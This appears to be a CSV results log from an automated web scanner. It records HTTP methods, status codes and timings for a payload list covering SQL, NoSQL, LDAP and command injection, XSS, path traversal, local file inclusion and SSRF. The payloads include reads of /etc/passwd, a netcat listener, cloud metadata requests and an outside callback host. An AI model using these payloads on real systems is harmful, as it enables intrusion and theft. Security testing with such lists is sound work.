Category,Method,Status,Response Time (ms),Payload,Is Redirect,WAF Detected,WAF Type,Timestamp,URL
"SQL Injection","POST",404,1212,"' OR SLEEP(5)--",false,false,"Unknown","",""
"SQL Injection","PUT",404,1242,"' OR SLEEP(5)--",false,false,"Unknown","",""
"SQL Injection","DELETE",404,1450,"' OR SLEEP(5)--",false,false,"Unknown","",""
"SQL Injection","GET",200,1480,"' OR 1=1 LIMIT 1;--",false,false,"Unknown","",""
"SQL Injection","POST",404,1508,"' OR 1=1 LIMIT 1;--",false,false,"Unknown","",""
"SQL Injection","PUT",404,1718,"' OR 1=1 LIMIT 1;--",false,false,"Unknown","",""
"SQL Injection","DELETE",404,1926,"' OR 1=1 LIMIT 1;--",false,false,"Unknown","",""
"SQL Injection","GET",200,2140,"WAITFOR DELAY '0:0:5'",false,false,"Unknown","",""
"SQL Injection","POST",404,2359,"WAITFOR DELAY '0:0:5'",false,false,"Unknown","",""
"SQL Injection","PUT",404,2576,"WAITFOR DELAY '0:0:5'",false,false,"Unknown","",""
"SQL Injection","DELETE",404,2783,"WAITFOR DELAY '0:0:5'",false,false,"Unknown","",""
"SQL Injection","GET",200,208,")) OR EXISTS(SELECT * FROM users WHERE username='admin')--",false,false,"Unknown","",""
"SQL Injection","POST",404,417,")) OR EXISTS(SELECT * FROM users WHERE username='admin')--",false,false,"Unknown","",""
"SQL Injection","PUT",404,626,")) OR EXISTS(SELECT * FROM users WHERE username='admin')--",false,false,"Unknown","",""
"SQL Injection","DELETE",404,833,")) OR EXISTS(SELECT * FROM users WHERE username='admin')--",false,false,"Unknown","",""
"SQL Injection","GET",200,862,"%2553%2527%2520OR%25201%253D1",false,false,"Unknown","",""
"SQL Injection","POST",404,1077,"%2553%2527%2520OR%25201%253D1",false,false,"Unknown","",""
"SQL Injection","PUT",404,1105,"%2553%2527%2520OR%25201%253D1",false,false,"Unknown","",""
"SQL Injection","DELETE",404,1319,"%2553%2527%2520OR%25201%253D1",false,false,"Unknown","",""
"SQL Injection","GET",200,1530,"/**/OR/**/1=1",false,false,"Unknown","",""
"SQL Injection","POST",404,1744,"/**/OR/**/1=1",false,false,"Unknown","",""
"SQL Injection","PUT",404,1771,"/**/OR/**/1=1",false,false,"Unknown","",""
"SQL Injection","DELETE",404,1982,"/**/OR/**/1=1",false,false,"Unknown","",""
"SQL Injection","GET",200,2022,"%2527%2520OR%25201%253D1--",false,false,"Unknown","",""
"SQL Injection","POST",404,2235,"%2527%2520OR%25201%253D1--",false,false,"Unknown","",""
"SQL Injection","PUT",404,2269,"%2527%2520OR%25201%253D1--",false,false,"Unknown","",""
"SQL Injection","DELETE",404,2297,"%2527%2520OR%25201%253D1--",false,false,"Unknown","",""
"SQL Injection","GET",200,2506,"'/**/OR/**/1=1--",false,false,"Unknown","",""
"SQL Injection","POST",404,2724,"'/**/OR/**/1=1--",false,false,"Unknown","",""
"SQL Injection","PUT",404,2754,"'/**/OR/**/1=1--",false,false,"Unknown","",""
"SQL Injection","DELETE",404,2784,"'/**/OR/**/1=1--",false,false,"Unknown","",""
"SQL Injection","GET",200,210,"'%09OR%091=1--",false,false,"Unknown","",""
"SQL Injection","POST",404,242,"'%09OR%091=1--",false,false,"Unknown","",""
"SQL Injection","PUT",404,451,"'%09OR%091=1--",false,false,"Unknown","",""
"SQL Injection","DELETE",404,663,"'%09OR%091=1--",false,false,"Unknown","",""
"SQL Injection","GET",200,693,"'\u0020OR\u00201=1--",false,false,"Unknown","",""
"SQL Injection","POST",404,723,"'\u0020OR\u00201=1--",false,false,"Unknown","",""
"SQL Injection","PUT",404,753,"'\u0020OR\u00201=1--",false,false,"Unknown","",""
"SQL Injection","DELETE",404,974,"'\u0020OR\u00201=1--",false,false,"Unknown","",""
"SQL Injection","GET",200,1005,"0x27204f52203120314431--",false,false,"Unknown","",""
"SQL Injection","POST",404,1035,"0x27204f52203120314431--",false,false,"Unknown","",""
"SQL Injection","PUT",404,1074,"0x27204f52203120314431--",false,false,"Unknown","",""
"SQL Injection","DELETE",404,1290,"0x27204f52203120314431--",false,false,"Unknown","",""
"SQL Injection","GET",200,1508,"'UNION/*!50000SELECT*/1,2,3--",false,false,"Unknown","",""
"SQL Injection","POST",404,1538,"'UNION/*!50000SELECT*/1,2,3--",false,false,"Unknown","",""
"SQL Injection","PUT",404,1571,"'UNION/*!50000SELECT*/1,2,3--",false,false,"Unknown","",""
"SQL Injection","DELETE",404,1601,"'UNION/*!50000SELECT*/1,2,3--",false,false,"Unknown","",""
"XSS","GET",403,1808,"<script>alert('xss')</script>",false,false,"Unknown","",""
"XSS","POST",404,2020,"<script>alert('xss')</script>",false,false,"Unknown","",""
"XSS","PUT",404,2226,"<script>alert('xss')</script>",false,false,"Unknown","",""
"XSS","DELETE",403,2443,"<script>alert('xss')</script>",false,false,"Unknown","",""
"XSS","GET",200,211,"<img src=x onerror=alert('xss')>",false,false,"Unknown","",""
"XSS","POST",404,422,"<img src=x onerror=alert('xss')>",false,false,"Unknown","",""
"XSS","PUT",404,451,"<img src=x onerror=alert('xss')>",false,false,"Unknown","",""
"XSS","DELETE",404,663,"<img src=x onerror=alert('xss')>",false,false,"Unknown","",""
"XSS","GET",403,881,"<iframe src=""javascript:alert('XSS')""></iframe>",false,false,"Unknown","",""
"XSS","POST",404,1096,"<iframe src=""javascript:alert('XSS')""></iframe>",false,false,"Unknown","",""
"XSS","PUT",404,1128,"<iframe src=""javascript:alert('XSS')""></iframe>",false,false,"Unknown","",""
"XSS","POST",404,1316,"<svg/onload=alert('xss')>",false,false,"Unknown","",""
"XSS","PUT",404,1319,"<svg/onload=alert('xss')>",false,false,"Unknown","",""
"XSS","DELETE",403,1319,"<iframe src=""javascript:alert('XSS')""></iframe>",false,false,"Unknown","",""
"XSS","GET",200,1320,"<svg/onload=alert('xss')>",false,false,"Unknown","",""
"XSS","DELETE",404,1547,"<svg/onload=alert('xss')>",false,false,"Unknown","",""
"XSS","GET",200,1764,"<body onload=alert('xss')>",false,false,"Unknown","",""
"XSS","POST",404,1795,"<body onload=alert('xss')>",false,false,"Unknown","",""
"XSS","PUT",404,1825,"<body onload=alert('xss')>",false,false,"Unknown","",""
"XSS","DELETE",404,1860,"<body onload=alert('xss')>",false,false,"Unknown","",""
"XSS","GET",403,2069,"<a href=javascript:alert('xss')>click</a>",false,false,"Unknown","",""
"XSS","POST",404,2099,"<a href=javascript:alert('xss')>click</a>",false,false,"Unknown","",""
"XSS","PUT",404,2134,"<a href=javascript:alert('xss')>click</a>",false,false,"Unknown","",""
"XSS","DELETE",403,2161,"<a href=javascript:alert('xss')>click</a>",false,false,"Unknown","",""
"XSS","GET",403,219,"<math href=javascript:alert(1)>",false,false,"Unknown","",""
"XSS","POST",404,270,"<math href=javascript:alert(1)>",false,false,"Unknown","",""
"XSS","PUT",404,483,"<math href=javascript:alert(1)>",false,false,"Unknown","",""
"XSS","DELETE",403,512,"<math href=javascript:alert(1)>",false,false,"Unknown","",""
"XSS","GET",403,550,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'",false,false,"Unknown","",""
"XSS","POST",404,767,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'",false,false,"Unknown","",""
"XSS","PUT",404,803,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'",false,false,"Unknown","",""
"XSS","DELETE",403,830,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'",false,false,"Unknown","",""
"XSS","GET",200,871,"<marquee onstart=alert(1)>",false,false,"Unknown","",""
"XSS","POST",404,899,"<marquee onstart=alert(1)>",false,false,"Unknown","",""
"XSS","PUT",404,928,"<marquee onstart=alert(1)>",false,false,"Unknown","",""
"XSS","DELETE",404,1143,"<marquee onstart=alert(1)>",false,false,"Unknown","",""
"XSS","GET",200,1174,"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//""",false,false,"Unknown","",""
"XSS","POST",404,1388,"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//""",false,false,"Unknown","",""
"XSS","PUT",404,1415,"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//""",false,false,"Unknown","",""
"XSS","DELETE",404,1630,"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//""",false,false,"Unknown","",""
"XSS","GET",200,1838,"<input onfocus=alert(1) autofocus>",false,false,"Unknown","",""
"XSS","POST",404,1866,"<input onfocus=alert(1) autofocus>",false,false,"Unknown","",""
"XSS","PUT",404,1896,"<input onfocus=alert(1) autofocus>",false,false,"Unknown","",""
"XSS","DELETE",404,2114,"<input onfocus=alert(1) autofocus>",false,false,"Unknown","",""
"XSS","GET",200,214,"%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",false,false,"Unknown","",""
"XSS","POST",404,244,"%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",false,false,"Unknown","",""
"XSS","PUT",404,274,"%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",false,false,"Unknown","",""
"XSS","DELETE",404,485,"%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",false,false,"Unknown","",""
"XSS","GET",200,514,"<img src=x onerror=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029>",false,false,"Unknown","",""
"XSS","POST",404,726,"<img src=x onerror=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029>",false,false,"Unknown","",""
"XSS","PUT",404,945,"<img src=x onerror=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029>",false,false,"Unknown","",""
"XSS","DELETE",404,973,"<img src=x onerror=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029>",false,false,"Unknown","",""
"XSS","GET",200,1002,"&#60;script&#62;alert&#40;1&#41;&#60;/script&#62;",false,false,"Unknown","",""
"XSS","POST",404,1030,"&#60;script&#62;alert&#40;1&#41;&#60;/script&#62;",false,false,"Unknown","",""
"XSS","PUT",404,1062,"&#60;script&#62;alert&#40;1&#41;&#60;/script&#62;",false,false,"Unknown","",""
"XSS","DELETE",404,1279,"&#60;script&#62;alert&#40;1&#41;&#60;/script&#62;",false,false,"Unknown","",""
"XSS","GET",200,1497,"<ScRiPt>AlErT(1)</ScRiPt>",false,false,"Unknown","",""
"XSS","POST",404,1532,"<ScRiPt>AlErT(1)</ScRiPt>",false,false,"Unknown","",""
"XSS","PUT",404,1564,"<ScRiPt>AlErT(1)</ScRiPt>",false,false,"Unknown","",""
"XSS","DELETE",404,1782,"<ScRiPt>AlErT(1)</ScRiPt>",false,false,"Unknown","",""
"XSS","GET",200,1989,"javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029",false,false,"Unknown","",""
"XSS","POST",404,2018,"javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029",false,false,"Unknown","",""
"XSS","PUT",404,2051,"javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029",false,false,"Unknown","",""
"XSS","DELETE",404,2265,"javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029",false,false,"Unknown","",""
"XSS","GET",200,231,"<details open ontoggle=alert(1)>",false,false,"Unknown","",""
"XSS","POST",404,275,"<details open ontoggle=alert(1)>",false,false,"Unknown","",""
"XSS","PUT",404,305,"<details open ontoggle=alert(1)>",false,false,"Unknown","",""
"XSS","DELETE",404,518,"<details open ontoggle=alert(1)>",false,false,"Unknown","",""
"Path Traversal","GET",200,743,"../../etc/passwd",false,false,"Unknown","",""
"Path Traversal","POST",404,774,"../../etc/passwd",false,false,"Unknown","",""
"Path Traversal","PUT",404,988,"../../etc/passwd",false,false,"Unknown","",""
"Path Traversal","DELETE",404,1024,"../../etc/passwd",false,false,"Unknown","",""
"Path Traversal","GET",200,1068,"../../../../../../../etc/passwd",false,false,"Unknown","",""
"Path Traversal","POST",404,1276,"../../../../../../../etc/passwd",false,false,"Unknown","",""
"Path Traversal","PUT",404,1309,"../../../../../../../etc/passwd",false,false,"Unknown","",""
"Path Traversal","DELETE",404,1337,"../../../../../../../etc/passwd",false,false,"Unknown","",""
"Path Traversal","GET",200,1555,"..\..\..\..\..\..\windows\win.ini",false,false,"Unknown","",""
"Path Traversal","POST",404,1592,"..\..\..\..\..\..\windows\win.ini",false,false,"Unknown","",""
"Path Traversal","PUT",404,1621,"..\..\..\..\..\..\windows\win.ini",false,false,"Unknown","",""
"Path Traversal","DELETE",404,1667,"..\..\..\..\..\..\windows\win.ini",false,false,"Unknown","",""
"Path Traversal","GET",200,1888,"..%2F..%2F..%2F..%2Fetc%2Fpasswd",false,false,"Unknown","",""
"Path Traversal","POST",404,1955,"..%2F..%2F..%2F..%2Fetc%2Fpasswd",false,false,"Unknown","",""
"Path Traversal","PUT",404,1998,"..%2F..%2F..%2F..%2Fetc%2Fpasswd",false,false,"Unknown","",""
"Path Traversal","DELETE",404,2030,"..%2F..%2F..%2F..%2Fetc%2Fpasswd",false,false,"Unknown","",""
"Path Traversal","GET",200,219,"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",false,false,"Unknown","",""
"Path Traversal","POST",404,253,"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",false,false,"Unknown","",""
"Path Traversal","PUT",404,469,"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",false,false,"Unknown","",""
"Path Traversal","DELETE",404,501,"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",false,false,"Unknown","",""
"Command Injection","GET",200,722,"$(cat /etc/passwd)",false,false,"Unknown","",""
"Command Injection","POST",404,758,"$(cat /etc/passwd)",false,false,"Unknown","",""
"Command Injection","PUT",404,970,"$(cat /etc/passwd)",false,false,"Unknown","",""
"Command Injection","DELETE",404,998,"$(cat /etc/passwd)",false,false,"Unknown","",""
"Command Injection","GET",200,1037,"| cat /etc/passwd",false,false,"Unknown","",""
"Command Injection","POST",404,1067,"| cat /etc/passwd",false,false,"Unknown","",""
"Command Injection","PUT",404,1097,"| cat /etc/passwd",false,false,"Unknown","",""
"Command Injection","DELETE",404,1313,"| cat /etc/passwd",false,false,"Unknown","",""
"Command Injection","GET",200,1342,"; ls -la",false,false,"Unknown","",""
"Command Injection","POST",404,1372,"; ls -la",false,false,"Unknown","",""
"Command Injection","PUT",404,1585,"; ls -la",false,false,"Unknown","",""
"Command Injection","DELETE",404,1801,"; ls -la",false,false,"Unknown","",""
"Command Injection","GET",200,1828,"& whoami",false,false,"Unknown","",""
"Command Injection","POST",404,2036,"& whoami",false,false,"Unknown","",""
"Command Injection","PUT",404,2247,"& whoami",false,false,"Unknown","",""
"Command Injection","DELETE",404,2454,"& whoami",false,false,"Unknown","",""
"Command Injection","GET",200,209,"| id",false,false,"Unknown","",""
"Command Injection","POST",404,419,"| id",false,false,"Unknown","",""
"Command Injection","PUT",404,634,"| id",false,false,"Unknown","",""
"Command Injection","DELETE",404,662,"| id",false,false,"Unknown","",""
"Command Injection","GET",200,872,"; ping -c 10 127.0.0.1",false,false,"Unknown","",""
"Command Injection","POST",404,902,"; ping -c 10 127.0.0.1",false,false,"Unknown","",""
"Command Injection","PUT",404,931,"; ping -c 10 127.0.0.1",false,false,"Unknown","",""
"Command Injection","DELETE",404,960,"; ping -c 10 127.0.0.1",false,false,"Unknown","",""
"Command Injection","GET",200,1183,"| nc -lvp 4444",false,false,"Unknown","",""
"Command Injection","POST",404,1398,"| nc -lvp 4444",false,false,"Unknown","",""
"Command Injection","PUT",404,1611,"| nc -lvp 4444",false,false,"Unknown","",""
"Command Injection","DELETE",404,1828,"| nc -lvp 4444",false,false,"Unknown","",""
"SSRF","GET",200,1855,"http://127.0.0.1/",false,false,"Unknown","",""
"SSRF","POST",404,2063,"http://127.0.0.1/",false,false,"Unknown","",""
"SSRF","PUT",404,2090,"http://127.0.0.1/",false,false,"Unknown","",""
"SSRF","DELETE",404,2306,"http://127.0.0.1/",false,false,"Unknown","",""
"SSRF","GET",200,2522,"file:///etc/passwd",false,false,"Unknown","",""
"SSRF","POST",404,2552,"file:///etc/passwd",false,false,"Unknown","",""
"SSRF","PUT",404,2768,"file:///etc/passwd",false,false,"Unknown","",""
"SSRF","DELETE",404,2797,"file:///etc/passwd",false,false,"Unknown","",""
"SSRF","GET",200,31,"http://127.0.0.1/latest/meta-data/",false,false,"Unknown","",""
"SSRF","POST",404,59,"http://127.0.0.1/latest/meta-data/",false,false,"Unknown","",""
"SSRF","PUT",404,90,"http://127.0.0.1/latest/meta-data/",false,false,"Unknown","",""
"SSRF","DELETE",404,119,"http://127.0.0.1/latest/meta-data/",false,false,"Unknown","",""
"SSRF","GET",200,334,"http://localhost:80/",false,false,"Unknown","",""
"SSRF","POST",404,554,"http://localhost:80/",false,false,"Unknown","",""
"SSRF","PUT",404,761,"http://localhost:80/",false,false,"Unknown","",""
"SSRF","DELETE",404,792,"http://localhost:80/",false,false,"Unknown","",""
"SSRF","GET",200,1006,"http://0.0.0.0:80/",false,false,"Unknown","",""
"SSRF","POST",404,1214,"http://0.0.0.0:80/",false,false,"Unknown","",""
"SSRF","PUT",404,1241,"http://0.0.0.0:80/",false,false,"Unknown","",""
"SSRF","DELETE",404,1473,"http://0.0.0.0:80/",false,false,"Unknown","",""
"SSRF","GET",200,1504,"http://[::1]/",false,false,"Unknown","",""
"SSRF","POST",404,1532,"http://[::1]/",false,false,"Unknown","",""
"SSRF","PUT",404,1746,"http://[::1]/",false,false,"Unknown","",""
"SSRF","DELETE",404,1963,"http://[::1]/",false,false,"Unknown","",""
"SSRF","GET",200,1991,"http://example.com@127.0.0.1/",false,false,"Unknown","",""
"SSRF","POST",404,2020,"http://example.com@127.0.0.1/",false,false,"Unknown","",""
"SSRF","PUT",404,2227,"http://example.com@127.0.0.1/",false,false,"Unknown","",""
"SSRF","DELETE",404,2258,"http://example.com@127.0.0.1/",false,false,"Unknown","",""
"SSRF","GET",200,208,"http://169.254.169.254/latest/meta-data/",false,false,"Unknown","",""
"SSRF","POST",404,237,"http://169.254.169.254/latest/meta-data/",false,false,"Unknown","",""
"SSRF","PUT",404,265,"http://169.254.169.254/latest/meta-data/",false,false,"Unknown","",""
"SSRF","DELETE",404,486,"http://169.254.169.254/latest/meta-data/",false,false,"Unknown","",""
"SSRF","GET",200,705,"http://[::ffff:127.0.0.1]",false,false,"Unknown","",""
"SSRF","POST",404,741,"http://[::ffff:127.0.0.1]",false,false,"Unknown","",""
"SSRF","PUT",404,772,"http://[::ffff:127.0.0.1]",false,false,"Unknown","",""
"SSRF","DELETE",404,988,"http://[::ffff:127.0.0.1]",false,false,"Unknown","",""
"SSRF","GET",200,1018,"http://127.1",false,false,"Unknown","",""
"SSRF","POST",404,1225,"http://127.1",false,false,"Unknown","",""
"SSRF","PUT",404,1441,"http://127.1",false,false,"Unknown","",""
"SSRF","DELETE",404,1473,"http://127.1",false,false,"Unknown","",""
"SSRF","GET",200,1502,"http://0177.0.0.1",false,false,"Unknown","",""
"SSRF","POST",404,1530,"http://0177.0.0.1",false,false,"Unknown","",""
"SSRF","PUT",404,1560,"http://0177.0.0.1",false,false,"Unknown","",""
"SSRF","DELETE",404,1590,"http://0177.0.0.1",false,false,"Unknown","",""
"SSRF","GET",200,1801,"http://2130706433",false,false,"Unknown","",""
"SSRF","POST",404,2010,"http://2130706433",false,false,"Unknown","",""
"SSRF","PUT",404,2038,"http://2130706433",false,false,"Unknown","",""
"SSRF","DELETE",404,2248,"http://2130706433",false,false,"Unknown","",""
"SSRF","GET",200,28,"d0vjq03vq99i18n2rq6gaw9riihcum3it.oast.live",false,false,"Unknown","",""
"SSRF","POST",404,247,"d0vjq03vq99i18n2rq6gaw9riihcum3it.oast.live",false,false,"Unknown","",""
"SSRF","PUT",404,276,"d0vjq03vq99i18n2rq6gaw9riihcum3it.oast.live",false,false,"Unknown","",""
"SSRF","DELETE",404,490,"d0vjq03vq99i18n2rq6gaw9riihcum3it.oast.live",false,false,"Unknown","",""
"NoSQL Injection","GET",200,520,"{'$gt':''}",false,false,"Unknown","",""
"NoSQL Injection","POST",404,548,"{'$gt':''}",false,false,"Unknown","",""
"NoSQL Injection","PUT",404,755,"{'$gt':''}",false,false,"Unknown","",""
"NoSQL Injection","DELETE",404,790,"{'$gt':''}",false,false,"Unknown","",""
"NoSQL Injection","GET",200,1006,"{""$ne"":null}",false,false,"Unknown","",""
"NoSQL Injection","POST",404,1214,"{""$ne"":null}",false,false,"Unknown","",""
"NoSQL Injection","PUT",404,1243,"{""$ne"":null}",false,false,"Unknown","",""
"NoSQL Injection","DELETE",404,1456,"{""$ne"":null}",false,false,"Unknown","",""
"NoSQL Injection","GET",200,1670,"{""username"": {""$ne"": null}, ""password"": {""$ne"": null}}",false,false,"Unknown","",""
"NoSQL Injection","POST",404,1892,"{""username"": {""$ne"": null}, ""password"": {""$ne"": null}}",false,false,"Unknown","",""
"NoSQL Injection","PUT",404,2103,"{""username"": {""$ne"": null}, ""password"": {""$ne"": null}}",false,false,"Unknown","",""
"NoSQL Injection","DELETE",404,2324,"{""username"": {""$ne"": null}, ""password"": {""$ne"": null}}",false,false,"Unknown","",""
"NoSQL Injection","GET",200,2356,"{""$where"": ""this.password == this.passwordConfirm""}",false,false,"Unknown","",""
"NoSQL Injection","POST",404,2563,"{""$where"": ""this.password == this.passwordConfirm""}",false,false,"Unknown","",""
"NoSQL Injection","PUT",404,2771,"{""$where"": ""this.password == this.passwordConfirm""}",false,false,"Unknown","",""
"NoSQL Injection","DELETE",404,2997,"{""$where"": ""this.password == this.passwordConfirm""}",false,false,"Unknown","",""
"NoSQL Injection","GET",200,33,"{""$or"": [{}, {}]}",false,false,"Unknown","",""
"NoSQL Injection","POST",404,239,"{""$or"": [{}, {}]}",false,false,"Unknown","",""
"NoSQL Injection","PUT",404,453,"{""$or"": [{}, {}]}",false,false,"Unknown","",""
"NoSQL Injection","DELETE",404,486,"{""$or"": [{}, {}]}",false,false,"Unknown","",""
"Local File Inclusion","GET",200,698,"php://filter/convert.base64-encode/resource=index.php",false,false,"Unknown","",""
"Local File Inclusion","POST",404,728,"php://filter/convert.base64-encode/resource=index.php",false,false,"Unknown","",""
"Local File Inclusion","PUT",404,945,"php://filter/convert.base64-encode/resource=index.php",false,false,"Unknown","",""
"Local File Inclusion","DELETE",404,1156,"php://filter/convert.base64-encode/resource=index.php",false,false,"Unknown","",""
"Local File Inclusion","GET",200,1372,"/etc/passwd",false,false,"Unknown","",""
"Local File Inclusion","POST",404,1580,"/etc/passwd",false,false,"Unknown","",""
"Local File Inclusion","PUT",404,1608,"/etc/passwd",false,false,"Unknown","",""
"Local File Inclusion","DELETE",404,1637,"/etc/passwd",false,false,"Unknown","",""
"Local File Inclusion","GET",200,1667,"../../../../../../../../etc/passwd",false,false,"Unknown","",""
"Local File Inclusion","POST",404,1695,"../../../../../../../../etc/passwd",false,false,"Unknown","",""
"Local File Inclusion","PUT",404,1914,"../../../../../../../../etc/passwd",false,false,"Unknown","",""
"Local File Inclusion","DELETE",404,1944,"../../../../../../../../etc/passwd",false,false,"Unknown","",""
"Local File Inclusion","GET",200,1975,"..\..\..\..\windows\win.ini",false,false,"Unknown","",""
"Local File Inclusion","POST",404,2189,"..\..\..\..\windows\win.ini",false,false,"Unknown","",""
"Local File Inclusion","PUT",404,2218,"..\..\..\..\windows\win.ini",false,false,"Unknown","",""
"Local File Inclusion","DELETE",404,2431,"..\..\..\..\windows\win.ini",false,false,"Unknown","",""
"Local File Inclusion","GET",200,30,"/proc/self/environ",false,false,"Unknown","",""
"Local File Inclusion","POST",404,58,"/proc/self/environ",false,false,"Unknown","",""
"Local File Inclusion","PUT",404,282,"/proc/self/environ",false,false,"Unknown","",""
"Local File Inclusion","DELETE",404,314,"/proc/self/environ",false,false,"Unknown","",""
"Local File Inclusion","GET",200,909,"index.php%00.jpg",false,false,"Unknown","",""
"Local File Inclusion","POST",404,1115,"index.php%00.jpg",false,false,"Unknown","",""
"Local File Inclusion","PUT",404,1144,"index.php%00.jpg",false,false,"Unknown","",""
"Local File Inclusion","DELETE",404,1358,"index.php%00.jpg",false,false,"Unknown","",""
"LDAP Injection","GET",200,1396,"*)(|(uid=*))",false,false,"Unknown","",""
"LDAP Injection","POST",404,1603,"*)(|(uid=*))",false,false,"Unknown","",""
"LDAP Injection","PUT",404,1812,"*)(|(uid=*))",false,false,"Unknown","",""
"LDAP Injection","DELETE",404,1844,"*)(|(uid=*))",false,false,"Unknown","",""
"LDAP Injection","GET",200,1874,"*))(objectClass=*))(|(objectClass=*)",false,false,"Unknown","",""
"LDAP Injection","POST",404,1901,"*))(objectClass=*))(|(objectClass=*)",false,false,"Unknown","",""
"LDAP Injection","PUT",404,1931,"*))(objectClass=*))(|(objectClass=*)",false,false,"Unknown","",""
"LDAP Injection","DELETE",404,1963,"*))(objectClass=*))(|(objectClass=*)",false,false,"Unknown","",""
"LDAP Injection","GET",200,1993,"admin)(|(password=*))",false,false,"Unknown","",""
"LDAP Injection","POST",404,2021,"admin)(|(password=*))",false,false,"Unknown","",""
"LDAP Injection","PUT",404,2049,"admin)(|(password=*))",false,false,"Unknown","",""
